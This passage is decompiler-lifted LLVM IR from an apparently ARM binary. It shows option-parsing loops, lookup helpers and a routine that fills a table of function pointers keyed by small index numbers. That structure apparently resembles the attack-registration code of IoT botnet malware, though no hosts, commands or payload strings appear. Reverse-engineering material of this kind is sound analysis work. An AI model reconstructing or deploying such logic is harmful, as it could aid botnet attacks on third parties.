  %v1_8384 = phi i32 [ %v1_83b0, %dec_label_pc_8380 ], [ %v2_836c, %dec_label_pc_8360 ]
  %v0_8380 = phi i32 [ %v1_83ac, %dec_label_pc_8380 ], [ %v1_837c, %dec_label_pc_8360 ]
  %v1_8380 = add i32 %v0_8380, -5
  %v2_8380 = inttoptr i32 %v1_8380 to i32*
  %v3_8380 = load i32, i32* %v2_8380, align 4
  store i32 %v3_8380, i32* %r1.global-to-local, align 4
  %v2_8384 = add i32 %v1_8384, 16
  %v3_8384 = inttoptr i32 %v2_8384 to i32*
  store i32 %v3_8380, i32* %v3_8384, align 4
  %v0_8388 = load i32, i32* @r7, align 4
  %v1_8388 = add i32 %v0_8388, -6
  store i32 %v1_8388, i32* %r3.global-to-local, align 4
  %v0_838c = load i32, i32* %r0.global-to-local, align 4
  %v1_838c = add i32 %v0_838c, -1
  %v2_838c = inttoptr i32 %v1_838c to i8*
  %v3_838c = load i8, i8* %v2_838c, align 1
  %v4_838c = zext i8 %v3_838c to i32
  store i32 %v4_838c, i32* %r2.global-to-local, align 4
  %v0_8390 = load i32, i32* @r6, align 4
  %v1_8390 = add i32 %v0_8390, -5
  store i32 %v1_8390, i32* @r6, align 4
  %v9_8394 = icmp eq i32 %v1_8390, %v1_8388
  store i1 %v9_8394, i1* %cpsr_z.global-to-local, align 1
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v0_838c, i32* @r4, align 4
  %v2_83a0 = load i32, i32* @ip, align 4
  %v3_83a0 = add i32 %v2_83a0, 20
  %v4_83a0 = inttoptr i32 %v3_83a0 to i8*
  store i8 %v3_838c, i8* %v4_83a0, align 1
  %v0_83a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_83a4 = load i32, i32* @ip, align 4
  %v2_83a4 = add i32 %v1_83a4, 4
  %v3_83a4 = inttoptr i32 %v2_83a4 to i32*
  store i32 %v0_83a4, i32* %v3_83a4, align 4
  %v0_83a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_83a8 = trunc i32 %v0_83a8 to i16
  %v2_83a8 = load i32, i32* @ip, align 4
  %v3_83a8 = inttoptr i32 %v2_83a8 to i16*
  store i16 %v1_83a8, i16* %v3_83a8, align 2
  %v0_83ac = load i32, i32* %r0.global-to-local, align 4
  %v1_83ac = add i32 %v0_83ac, 5
  store i32 %v1_83ac, i32* %r0.global-to-local, align 4
  %v0_83b0 = load i32, i32* @ip, align 4
  %v1_83b0 = add i32 %v0_83b0, 24
  store i32 %v1_83b0, i32* @ip, align 4
  %v0_83b4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_83b4, label %dec_label_pc_83b8, label %dec_label_pc_8380

dec_label_pc_83b8:                                ; preds = %dec_label_pc_8380
  %v0_83b8 = load i32, i32* @r6, align 4
  %v2_83b8 = icmp eq i32 %v0_83b8, 0
  store i1 %v2_83b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_83b8, label %dec_label_pc_84bc, label %dec_label_pc_83c0

dec_label_pc_83c0:                                ; preds = %dec_label_pc_83b8
  %v0_83c0 = load i32, i32* @r4, align 4
  %v1_83c0 = inttoptr i32 %v0_83c0 to i8*
  %v2_83c0 = load i8, i8* %v1_83c0, align 1
  %v3_83c0 = zext i8 %v2_83c0 to i32
  store i32 %v3_83c0, i32* @r5, align 4
  %v2_83c4 = icmp eq i8 %v2_83c0, 0
  store i1 %v2_83c4, i1* %cpsr_z.global-to-local, align 1
  %v0_83c8 = load i32, i32* @r7, align 4
  %v1_83c8 = add i32 %v0_83c8, -7
  store i32 %v1_83c8, i32* @r8, align 4
  br i1 %v2_83c4, label %bb, label %dec_label_pc_83d4

bb:                                               ; preds = %dec_label_pc_83c0
  store i32 %v3_83c0, i32* @r6, align 4
  br label %dec_label_pc_8498

dec_label_pc_83d4:                                ; preds = %dec_label_pc_83c0
  store i32 %v3_83c0, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_83dc = call i32 @function_1215c(i32 %v3_83c0, i32 8)
  store i32 %v2_83dc, i32* %r0.global-to-local, align 4
  %v0_83e0 = load i32, i32* @r8, align 4
  %v2_83e0 = icmp eq i32 %v0_83e0, 0
  store i1 %v2_83e0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_83dc, i32* @r6, align 4
  br i1 %v2_83e0, label %dec_label_pc_84bc, label %dec_label_pc_83ec

dec_label_pc_83ec:                                ; preds = %dec_label_pc_83d4
  %v0_83ec = load i32, i32* @r4, align 4
  %v1_83ec = add i32 %v0_83ec, 1
  %v2_83ec = inttoptr i32 %v1_83ec to i8*
  %v3_83ec = load i8, i8* %v2_83ec, align 1
  %v0_83f0 = load i32, i32* @r7, align 4
  %v7_83f0 = icmp eq i32 %v0_83f0, 8
  store i1 %v7_83f0, i1* %cpsr_z.global-to-local, align 1
  %v3_83f4 = add i32 %v2_83dc, 4
  %v4_83f4 = inttoptr i32 %v3_83f4 to i8*
  store i8 %v3_83ec, i8* %v4_83f4, align 1
  %v0_83f8 = load i32, i32* @r4, align 4
  %v1_83f8 = add i32 %v0_83f8, 1
  store i32 %v1_83f8, i32* %r3.global-to-local, align 4
  %v0_83fc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_83fc, label %dec_label_pc_84bc, label %dec_label_pc_8400

dec_label_pc_8400:                                ; preds = %dec_label_pc_83ec
  %v1_8400 = add i32 %v0_83f8, 2
  %v2_8400 = inttoptr i32 %v1_8400 to i8*
  %v3_8400 = load i8, i8* %v2_8400, align 1
  %v4_8400 = zext i8 %v3_8400 to i32
  store i32 %v4_8400, i32* @r4, align 4
  %v0_8404 = load i32, i32* @r7, align 4
  %v1_8404 = add i32 %v0_8404, -9
  store i32 %v1_8404, i32* @r8, align 4
  %v9_8408 = icmp eq i32 %v1_8404, %v4_8400
  store i1 %v9_8408, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8400, i32* %r1.global-to-local, align 4
  %v5_8410 = icmp slt i32 %v1_8404, %v4_8400
  br i1 %v5_8410, label %dec_label_pc_84bc, label %bb35

bb35:                                             ; preds = %dec_label_pc_8400
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_84147 = add i32 %v0_83f8, 3
  store i32 %v7_84147, i32* @r7, align 4
  %v6_8418 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v6_8418, i32* @sl, align 4
  br label %dec_label_pc_845c

dec_label_pc_8428:                                ; preds = %dec_label_pc_845c
  %v0_8428 = load i32, i32* @r8, align 4
  %v1_8428 = load i32, i32* @r4, align 4
  %v2_8428 = sub i32 %v0_8428, %v1_8428
  store i32 %v2_8428, i32* %r2.global-to-local, align 4
  %v9_8428 = icmp eq i32 %v0_8428, %v1_8428
  store i1 %v9_8428, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8428, label %dec_label_pc_84bc, label %dec_label_pc_8430

dec_label_pc_8430:                                ; preds = %dec_label_pc_8428
  %v1_8430 = load i32, i32* @r7, align 4
  %v2_8430 = add i32 %v1_8430, %v1_8428
  %v3_8430 = inttoptr i32 %v2_8430 to i8*
  %v4_8430 = load i8, i8* %v3_8430, align 1
  store i32 %v2_8430, i32* %r0.global-to-local, align 4
  %v1_8438 = add i32 %v2_8428, -1
  store i32 %v1_8438, i32* %r2.global-to-local, align 4
  %v7_8438 = icmp eq i32 %v2_8428, 1
  store i1 %v7_8438, i1* %cpsr_z.global-to-local, align 1
  %v3_843c = add i32 %v2_8490, 4
  %v4_843c = inttoptr i32 %v3_843c to i8*
  store i8 %v4_8430, i8* %v4_843c, align 1
  %v0_8440 = load i32, i32* %r0.global-to-local, align 4
  %v1_8440 = add i32 %v0_8440, 1
  store i32 %v1_8440, i32* %r3.global-to-local, align 4
  %v0_8444 = load i32, i32* %r2.global-to-local, align 4
  %v1_8444 = add i32 %v0_8444, -1
  store i32 %v1_8444, i32* @r8, align 4
  %v1_8448 = add i32 %v0_8440, 2
  store i32 %v1_8448, i32* @r7, align 4
  %v0_844c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_844c, label %dec_label_pc_84bc, label %dec_label_pc_8450

dec_label_pc_8450:                                ; preds = %dec_label_pc_8430
  %v2_8450 = inttoptr i32 %v1_8440 to i8*
  %v3_8450 = load i8, i8* %v2_8450, align 1
  %v4_8450 = zext i8 %v3_8450 to i32
  store i32 %v4_8450, i32* @r4, align 4
  %v2_8454 = sub i32 %v1_8444, %v4_8450
  %tmp36 = sub i32 0, %v2_8454
  %v6_8454 = and i32 %v1_8444, %tmp36
  %v7_8454 = icmp slt i32 %v6_8454, 0
  %v8_8454 = icmp slt i32 %v2_8454, 0
  %v9_8454 = icmp eq i32 %v1_8444, %v4_8450
  store i1 %v9_8454, i1* %cpsr_z.global-to-local, align 1
  %v2_8458 = xor i1 %v8_8454, %v7_8454
  br i1 %v2_8458, label %dec_label_pc_84bc, label %dec_label_pc_845c

dec_label_pc_845c:                                ; preds = %bb35, %dec_label_pc_8450
  %v0_8460 = phi i32 [ %v4_8400, %bb35 ], [ %v4_8450, %dec_label_pc_8450 ]
  %stack_var_-48.1 = phi i32 [ 0, %bb35 ], [ %v1_8470, %dec_label_pc_8450 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_8460 = add nuw nsw i32 %v0_8460, 1
  store i32 %v1_8460, i32* %r0.global-to-local, align 4
  %v2_8464 = call i32 @function_1215c(i32 %v1_8460, i32 1)
  store i32 %v2_8464, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-48.1, i32* %r3.global-to-local, align 4
  %v1_846c = load i32, i32* @sl, align 4
  %v2_846c = inttoptr i32 %v1_846c to i32*
  store i32 %v2_8464, i32* %v2_846c, align 4
  %v0_8470 = load i32, i32* %r3.global-to-local, align 4
  %v1_8470 = add i32 %v0_8470, 1
  store i32 %v1_8470, i32* %r3.global-to-local, align 4
  %v0_8474 = load i32, i32* @r4, align 4
  store i32 %v0_8474, i32* %r2.global-to-local, align 4
  %v0_8478 = load i32, i32* @r7, align 4
  store i32 %v0_8478, i32* %r1.global-to-local, align 4
  %v3_8480 = call i32 @function_1038c(i32 %v2_8464, i32 %v0_8478, i32 %v0_8474)
  store i32 %v3_8480, i32* %r0.global-to-local, align 4
  store i32 %v1_8470, i32* %r2.global-to-local, align 4
  %v3_8488 = mul i32 %v1_8470, 8
  store i32 %v3_8488, i32* %r3.global-to-local, align 4
  %v1_848c = load i32, i32* @r5, align 4
  %v9_848c = icmp eq i32 %v1_8470, %v1_848c
  store i1 %v9_848c, i1* %cpsr_z.global-to-local, align 1
  %v0_8490 = load i32, i32* @r6, align 4
  %v2_8490 = add i32 %v0_8490, %v3_8488
  store i32 %v2_8490, i32* @sl, align 4
  br i1 %v9_848c, label %dec_label_pc_8498, label %dec_label_pc_8428

dec_label_pc_8498:                                ; preds = %dec_label_pc_845c, %bb
  %v0_8498 = call i32 @function_11204()
  %v2_84a0 = inttoptr i32 %v0_8498 to i32*
  store i32 0, i32* %v2_84a0, align 4
  store i32 %v4_8330, i32* %r1.global-to-local, align 4
  %v0_84a8 = load i32, i32* @fp, align 4
  store i32 %v0_84a8, i32* %r0.global-to-local, align 4
  %v0_84ac = load i32, i32* @sb, align 4
  store i32 %v0_84ac, i32* %r2.global-to-local, align 4
  store i32 %v2_836c, i32* %r3.global-to-local, align 4
  %v2_84b4 = load i32, i32* @r5, align 4
  %v5_84b4 = load i32, i32* @r6, align 4
  %v6_84b8 = trunc i32 %v2_84b4 to i8
  %v7_84b8 = call i32 @function_81ec(i32 %v0_84a8, i32 %v4_8330, i32 %v0_84ac, i32 %v2_836c, i8 %v6_84b8, i32 %v5_84b4)
  store i32 %v7_84b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_84bc

dec_label_pc_84bc:                                ; preds = %dec_label_pc_8450, %dec_label_pc_8430, %dec_label_pc_8428, %dec_label_pc_8400, %dec_label_pc_83ec, %dec_label_pc_83d4, %dec_label_pc_83b8, %dec_label_pc_8498
  store i32 %v2_836c, i32* %r3.global-to-local, align 4
  %v2_84c0 = icmp eq i32 %v2_836c, 0
  store i1 %v2_84c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_84c0, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_84bc
  store i32 %v2_836c, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_84bc, %bb37
  store i32 33996, i32* @lr, align 4
  %v1_84c8 = xor i1 %v2_84c0, true
  call void @__pseudo_cond_branch(i1 %v1_84c8, i32 ptrtoint (i32* @global_var_128a8.21 to i32))
  %v0_84cc = load i32, i32* @r6, align 4
  %v2_84cc = icmp eq i32 %v0_84cc, 0
  store i1 %v2_84cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_84cc, label %.dec_label_pc_8300_crit_edge, label %dec_label_pc_84d4

.dec_label_pc_8300_crit_edge:                     ; preds = %bb38
  %v1_8308.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8300

dec_label_pc_84d4:                                ; preds = %bb38
  %v0_84d4 = load i32, i32* @r5, align 4
  %v2_84d4 = icmp eq i32 %v0_84d4, 0
  store i1 %v2_84d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_84d4, label %dec_label_pc_84f8, label %dec_label_pc_84dc

dec_label_pc_84dc:                                ; preds = %dec_label_pc_84d4
  br label %dec_label_pc_84e0

dec_label_pc_84e0:                                ; preds = %dec_label_pc_84e0, %dec_label_pc_84dc
  %v0_84e8 = phi i32 [ 0, %dec_label_pc_84dc ], [ %v1_84f0, %dec_label_pc_84e0 ]
  %v0_84e0 = phi i32 [ %v0_84cc, %dec_label_pc_84dc ], [ %v0_84f8.pre, %dec_label_pc_84e0 ]
  %v4_84e0 = mul i32 %v0_84e8, 8
  %v5_84e0 = add i32 %v4_84e0, %v0_84e0
  %v6_84e0 = inttoptr i32 %v5_84e0 to i32*
  %v7_84e0 = load i32, i32* %v6_84e0, align 4
  store i32 %v7_84e0, i32* %r0.global-to-local, align 4
  %v2_84e4 = icmp eq i32 %v7_84e0, 0
  store i1 %v2_84e4, i1* %cpsr_z.global-to-local, align 1
  %v1_84e8 = add i32 %v0_84e8, 1
  store i32 %v1_84e8, i32* @r4, align 4
  store i32 34032, i32* @lr, align 4
  %v1_84ec = xor i1 %v2_84e4, true
  call void @__pseudo_cond_branch(i1 %v1_84ec, i32 ptrtoint (i32* @global_var_128a8.21 to i32))
  %v0_84f0 = load i32, i32* @r5, align 4
  %v1_84f0 = load i32, i32* @r4, align 4
  %v9_84f0 = icmp eq i32 %v0_84f0, %v1_84f0
  store i1 %v9_84f0, i1* %cpsr_z.global-to-local, align 1
  %v0_84f8.pre = load i32, i32* @r6, align 4
  br i1 %v9_84f0, label %dec_label_pc_84f8, label %dec_label_pc_84e0

dec_label_pc_84f8:                                ; preds = %dec_label_pc_84e0, %dec_label_pc_84d4
  %v0_84f8 = phi i32 [ %v0_84cc, %dec_label_pc_84d4 ], [ %v0_84f8.pre, %dec_label_pc_84e0 ]
  store i32 %v0_84f8, i32* @r0, align 4
  %v0_84fc = call i32 @function_128a8()
  store i32 %v0_84fc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8300

; uselistorder directives
  uselistorder i32 %v0_84fc, { 1, 0 }
  uselistorder i32 %v1_84f0, { 1, 0 }
  uselistorder i1 %v2_84c0, { 0, 2, 1 }
  uselistorder i32 %v2_8490, { 1, 0 }
  uselistorder i32 %v3_8488, { 1, 0 }
  uselistorder i32 %v1_8470, { 3, 0, 2, 4, 1 }
  uselistorder i32 %v2_8454, { 1, 0 }
  uselistorder i32 %v4_8450, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8444, { 2, 0, 1, 3 }
  uselistorder i32 %v3_83c0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_83b0, { 1, 0 }
  uselistorder i32 %v1_83ac, { 1, 0 }
  uselistorder i32 %v2_836c, { 0, 4, 5, 2, 3, 1, 6 }
  uselistorder i32 %v4_8340, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8310, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v2_830c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_82f8, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 4, 5, 6, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 6, 2, 3, 4, 0, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 20, 3, 21, 5, 8, 10, 9, 6, 7, 16, 17, 11, 12, 13, 14, 15, 18, 19, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_84bc, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_845c, { 1, 0 }
  uselistorder label %dec_label_pc_8300, { 6, 1, 0, 2, 3, 4, 5 }
}

define i32 @function_8504(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_8504:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_8504 = icmp eq i32 %arg1, 0
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_8504, label %dec_label_pc_854c, label %dec_label_pc_8514

dec_label_pc_8514:                                ; preds = %dec_label_pc_8504
  %v0_8514 = load i32, i32* %r1.global-to-local, align 4
  %v1_8514 = add i32 %v0_8514, 4
  %v2_8514 = inttoptr i32 %v1_8514 to i8*
  %v3_8514 = load i8, i8* %v2_8514, align 1
  %v4_8514 = zext i8 %v3_8514 to i32
  %v9_8518 = icmp eq i32 %v4_8514, %arg3
  br i1 %v9_8518, label %dec_label_pc_8558, label %dec_label_pc_853c.preheader

dec_label_pc_853c.preheader:                      ; preds = %dec_label_pc_8514
  br label %dec_label_pc_853c

dec_label_pc_852c:                                ; preds = %dec_label_pc_853c
  %v1_852c = add i32 %v0_8534.in, 12
  %v2_852c = inttoptr i32 %v1_852c to i8*
  %v3_852c = load i8, i8* %v2_852c, align 1
  %v4_852c = zext i8 %v3_852c to i32
  %v9_8530 = icmp eq i32 %v4_852c, %arg3
  br i1 %v9_8530, label %dec_label_pc_8558, label %dec_label_pc_853c

dec_label_pc_853c:                                ; preds = %dec_label_pc_853c.preheader, %dec_label_pc_852c
  %v0_8534.in = phi i32 [ %v0_8514, %dec_label_pc_853c.preheader ], [ %v0_8534, %dec_label_pc_852c ]
  %v0_853c = phi i32 [ 0, %dec_label_pc_853c.preheader ], [ %v1_853c, %dec_label_pc_852c ]
  %v0_8534 = add i32 %v0_8534.in, 8
  %v1_853c = add i32 %v0_853c, 1
  %v9_8540 = icmp eq i32 %v1_853c, %arg1
  store i32 %v0_8534, i32* %r1.global-to-local, align 4
  br i1 %v9_8540, label %dec_label_pc_854c, label %dec_label_pc_852c

dec_label_pc_854c:                                ; preds = %dec_label_pc_853c, %dec_label_pc_8558, %dec_label_pc_8504, %dec_label_pc_8564
  %v0_854c = phi i32 [ %arg4, %dec_label_pc_8558 ], [ %arg4, %dec_label_pc_8504 ], [ %v1_8564, %dec_label_pc_8564 ], [ %arg4, %dec_label_pc_853c ]
  ret i32 %v0_854c

dec_label_pc_8558:                                ; preds = %dec_label_pc_852c, %dec_label_pc_8514
  %v0_8558 = phi i32 [ %v0_8514, %dec_label_pc_8514 ], [ %v0_8534, %dec_label_pc_852c ]
  %v1_8558 = inttoptr i32 %v0_8558 to i32*
  %v2_8558 = load i32, i32* %v1_8558, align 4
  store i32 %v2_8558, i32* @r0, align 4
  %v2_855c = icmp eq i32 %v2_8558, 0
  br i1 %v2_855c, label %dec_label_pc_854c, label %dec_label_pc_8564

dec_label_pc_8564:                                ; preds = %dec_label_pc_8558
  %v1_8564 = call i32 @function_11344(i32 %v2_8558)
  br label %dec_label_pc_854c

; uselistorder directives
  uselistorder i32 %v1_853c, { 1, 0 }
  uselistorder i32 %v0_8534, { 1, 0, 2 }
  uselistorder i32 %v0_8534.in, { 1, 0 }
  uselistorder i32 %v0_8514, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_854c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_853c, { 1, 0 }
}

define i32 @function_8570(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_8570:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_8570 = icmp eq i32 %arg1, 0
  %v3_8574 = load i32, i32* @r4, align 4
  store i32 %v3_8574, i32* %stack_var_-8, align 4
  %v6_8574 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_8570, label %dec_label_pc_85b8, label %dec_label_pc_8580

dec_label_pc_8580:                                ; preds = %dec_label_pc_8570
  %v0_8580 = load i32, i32* %r1.global-to-local, align 4
  %v1_8580 = add i32 %v0_8580, 4
  %v2_8580 = inttoptr i32 %v1_8580 to i8*
  %v3_8580 = load i8, i8* %v2_8580, align 1
  %v4_8580 = zext i8 %v3_8580 to i32
  %v9_8584 = icmp eq i32 %v4_8580, %arg3
  br i1 %v9_8584, label %dec_label_pc_85c4, label %dec_label_pc_85a8.preheader

dec_label_pc_85a8.preheader:                      ; preds = %dec_label_pc_8580
  br label %dec_label_pc_85a8

dec_label_pc_8598:                                ; preds = %dec_label_pc_85a8
  %v1_8598 = add i32 %v0_85a0.in, 12
  %v2_8598 = inttoptr i32 %v1_8598 to i8*
  %v3_8598 = load i8, i8* %v2_8598, align 1
  %v4_8598 = zext i8 %v3_8598 to i32
  %v9_859c = icmp eq i32 %v4_8598, %arg3
  br i1 %v9_859c, label %dec_label_pc_85c4, label %dec_label_pc_85a8

dec_label_pc_85a8:                                ; preds = %dec_label_pc_85a8.preheader, %dec_label_pc_8598
  %v0_85a0.in = phi i32 [ %v0_8580, %dec_label_pc_85a8.preheader ], [ %v0_85a0, %dec_label_pc_8598 ]
  %v0_85a8 = phi i32 [ 0, %dec_label_pc_85a8.preheader ], [ %v1_85a8, %dec_label_pc_8598 ]
  %v0_85a0 = add i32 %v0_85a0.in, 8
  %v1_85a8 = add i32 %v0_85a8, 1
  store i32 %v1_85a8, i32* @lr, align 4
  %v9_85ac = icmp eq i32 %v1_85a8, %arg1
  store i32 %v0_85a0, i32* %r1.global-to-local, align 4
  br i1 %v9_85ac, label %dec_label_pc_85b8, label %dec_label_pc_8598

dec_label_pc_85b8:                                ; preds = %dec_label_pc_85a8, %dec_label_pc_85c4, %dec_label_pc_8570, %dec_label_pc_85d0
  %v2_85bc = phi i32 [ %v3_8574, %dec_label_pc_85c4 ], [ %v3_8574, %dec_label_pc_8570 ], [ %v2_85bc.pre, %dec_label_pc_85d0 ], [ %v3_8574, %dec_label_pc_85a8 ]
  %v0_85b8 = phi i32 [ %arg4, %dec_label_pc_85c4 ], [ %arg4, %dec_label_pc_8570 ], [ %v3_85d4, %dec_label_pc_85d0 ], [ %arg4, %dec_label_pc_85a8 ]
  store i32 %v2_85bc, i32* @r4, align 4
  store i32 %v6_8574, i32* @lr, align 4
  ret i32 %v0_85b8

dec_label_pc_85c4:                                ; preds = %dec_label_pc_8598, %dec_label_pc_8580
  %v0_85c4 = phi i32 [ %v0_8580, %dec_label_pc_8580 ], [ %v0_85a0, %dec_label_pc_8598 ]
  %v1_85c4 = inttoptr i32 %v0_85c4 to i32*
  %v2_85c4 = load i32, i32* %v1_85c4, align 4
  %v2_85c8 = icmp eq i32 %v2_85c4, 0
  br i1 %v2_85c8, label %dec_label_pc_85b8, label %dec_label_pc_85d0

dec_label_pc_85d0:                                ; preds = %dec_label_pc_85c4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_85d4 = inttoptr i32 %v2_85c4 to i8*
  %v3_85d4 = call i32 @function_10440(i8* %v2_85d4, i32 10)
  %v2_85bc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_85b8

; uselistorder directives
  uselistorder i32 %v1_85a8, { 1, 2, 0 }
  uselistorder i32 %v0_85a0, { 1, 0, 2 }
  uselistorder i32 %v0_85a0.in, { 1, 0 }
  uselistorder i32 %v0_8580, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_85b8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_85a8, { 1, 0 }
}

define i32 @function_85e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_85e0:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_85e0 = load i32, i32* @r4, align 4
  store i32 %v3_85e0, i32* %stack_var_-24, align 4
  %v6_85e0 = load i32, i32* @r5, align 4
  %v9_85e0 = load i32, i32* @r6, align 4
  %v12_85e0 = load i32, i32* @r7, align 4
  %v15_85e0 = load i32, i32* @r8, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_85ec = call i32 @function_1215c(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_1e9d0.17 to i32), i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1e9d4.19 to i32), i32* @r6, align 4
  store i32 47208, i32* %r2.global-to-local, align 4
  store i32 %v2_85ec, i32* @r5, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_1e9d1.25 to i32), i32* %r1.global-to-local, align 4
  %v2_860c = load i32, i32* @global_var_1e9d4.19, align 4
  %v2_8610 = inttoptr i32 %v2_85ec to i32*
  store i32 47208, i32* %v2_8610, align 4
  %v3_8614 = load i32, i32* @r5, align 4
  %v4_8614 = add i32 %v3_8614, 4
  %v5_8614 = inttoptr i32 %v4_8614 to i8*
  store i8 0, i8* %v5_8614, align 1
  %v0_8618 = load i32, i32* %r1.global-to-local, align 4
  %v3_8618 = mul i32 %v0_8618, 4
  store i32 %v3_8618, i32* %r1.global-to-local, align 4
  %v5_861c = inttoptr i32 %v2_860c to i32*
  %v6_861c = call i32 @function_12290(i32* %v5_861c, i32 %v3_8618, i32 47208, i32 0)
  %v2_8620 = load i8, i8* bitcast (i8** @global_var_1e9d0.17 to i8*), align 4
  %v3_8620 = zext i8 %v2_8620 to i32
  store i32 %v6_861c, i32* %r2.global-to-local, align 4
  %v0_8628 = load i32, i32* @r5, align 4
  %v5_8628 = mul nuw nsw i32 %v3_8620, 4
  %v6_8628 = add i32 %v5_8628, %v6_861c
  %v7_8628 = inttoptr i32 %v6_8628 to i32*
  store i32 %v0_8628, i32* %v7_8628, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_1e9d1.25 to i32), i32* %r3.global-to-local, align 4
  %v1_8638 = load i32, i32* @r6, align 4
  %v2_8638 = inttoptr i32 %v1_8638 to i32*
  store i32 %v6_861c, i32* %v2_8638, align 4
  %v0_863c = load i32, i32* %r3.global-to-local, align 4
  %v1_863c = trunc i32 %v0_863c to i8
  %v2_863c = load i32, i32* @r4, align 4
  %v3_863c = inttoptr i32 %v2_863c to i8*
  store i8 %v1_863c, i8* %v3_863c, align 1
  %v2_8640 = call i32 @function_1215c(i32 1, i32 8)
  store i32 ptrtoint (i32* @global_var_bd54.27 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* @r8, align 4
  store i32 %v2_8640, i32* @r5, align 4
  store i32 ptrtoint (i8* @global_var_1e9d1.25 to i32), i32* %r1.global-to-local, align 4
  %v2_8658 = load i32, i32* @global_var_1e9d4.19, align 4
  %v2_865c = inttoptr i32 %v2_8640 to i32*
  store i32 ptrtoint (i32* @global_var_bd54.27 to i32), i32* %v2_865c, align 4
  %v0_8660 = load i32, i32* @r8, align 4
  %v1_8660 = trunc i32 %v0_8660 to i8
  %v2_8660 = load i32, i32* @r5, align 4
  %v3_8660 = add i32 %v2_8660, 4
  %v4_8660 = inttoptr i32 %v3_8660 to i8*
  store i8 %v1_8660, i8* %v4_8660, align 1
  %v0_8664 = load i32, i32* %r1.global-to-local, align 4
  %v3_8664 = mul i32 %v0_8664, 4
  store i32 %v3_8664, i32* %r1.global-to-local, align 4
  %v4_8668 = inttoptr i32 %v2_8658 to i32*
  %v5_8668 = call i32 @function_12290(i32* %v4_8668, i32 %v3_8664, i32 %v6_861c, i32 ptrtoint (i32* @global_var_bd54.27 to i32))
  %v2_866c = load i8, i8* bitcast (i8** @global_var_1e9d0.17 to i8*), align 4
  %v3_866c = zext i8 %v2_866c to i32
  store i32 %v3_866c, i32* %r3.global-to-local, align 4
  store i32 %v5_8668, i32* %r2.global-to-local, align 4
  %v0_8674 = load i32, i32* @r5, align 4
  %v5_8674 = mul nuw nsw i32 %v3_866c, 4
  %v6_8674 = add i32 %v5_8674, %v5_8668
  %v7_8674 = inttoptr i32 %v6_8674 to i32*
  store i32 %v0_8674, i32* %v7_8674, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_867c = load i32, i32* %r3.global-to-local, align 4
  %v1_867c = load i32, i32* @r8, align 4
  %v2_867c = add i32 %v1_867c, %v0_867c
